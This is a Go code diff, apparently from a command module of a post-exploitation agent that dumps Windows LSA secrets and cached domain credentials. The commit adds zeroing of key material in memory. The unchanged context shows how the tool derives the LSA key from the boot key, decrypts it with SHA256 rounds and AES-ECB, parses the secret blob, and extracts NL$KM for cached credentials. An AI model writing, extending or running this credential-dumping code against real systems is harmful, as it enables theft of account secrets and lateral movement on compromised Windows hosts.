@@ -57,6 +57,7 @@ func (c *LsaSecretsCommand) Execute(task structs.Task) structs.CommandResult {
 			Completed: true,
 		}
 	}
+	defer structs.ZeroBytes(bootKey)
 
 	// Decrypt LSA encryption key from SECURITY hive
 	lsaKey, err := lsaDecryptKey(bootKey)
@@ -67,6 +68,7 @@ func (c *LsaSecretsCommand) Execute(task structs.Task) structs.CommandResult {
 			Completed: true,
 		}
 	}
+	defer structs.ZeroBytes(lsaKey)
 
 	switch args.Action {
 	case "dump":
@@ -104,12 +106,14 @@ func lsaDecryptKey(bootKey []byte) ([]byte, error) {
 
 	// Derive AES-256 key: SHA256 of (boot_key + encData[0:32]) iterated 1000 times
 	tmpKey := lsaSHA256Rounds(bootKey, encData[:32], 1000)
+	defer structs.ZeroBytes(tmpKey)
 
 	// AES-256-ECB decrypt the remaining data
 	plaintext, err := lsaAESDecryptECB(tmpKey, encData[32:])
 	if err != nil {
 		return nil, fmt.Errorf("AES decrypt PolEKList: %v", err)
 	}
+	defer structs.ZeroBytes(plaintext)
 
 	// LSA_SECRET_BLOB: length(4) + unknown(12) + secret(rest)
 	// Within secret: header(52 bytes) + lsa_key(32 bytes)
@@ -201,6 +205,10 @@ func lsaDumpSecrets(lsaKey []byte) structs.CommandResult {
 				Comment:        "lsa-secrets (DPAPI user:machine keys)",
 			})
 		}
+
+		// Zero decrypted secret material and raw registry data
+		structs.ZeroBytes(secret)
+		structs.ZeroBytes(data)
 	}
 
 	sb.WriteString(fmt.Sprintf("Decrypted: %d/%d secrets\n", decrypted, len(subkeys)))
@@ -240,6 +248,7 @@ func lsaDumpCachedCreds(lsaKey []byte) structs.CommandResult {
 	}
 
 	nlkm, err := lsaDecryptSecret(nlkmData, lsaKey)
+	structs.ZeroBytes(nlkmData)
 	if err != nil {
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Failed to decrypt NL$KM: %v", err),
@@ -247,6 +256,7 @@ func lsaDumpCachedCreds(lsaKey []byte) structs.CommandResult {
 			Completed: true,
 		}
 	}
+	defer structs.ZeroBytes(nlkm)
 
 	if len(nlkm) < 32 {
 		return structs.CommandResult{
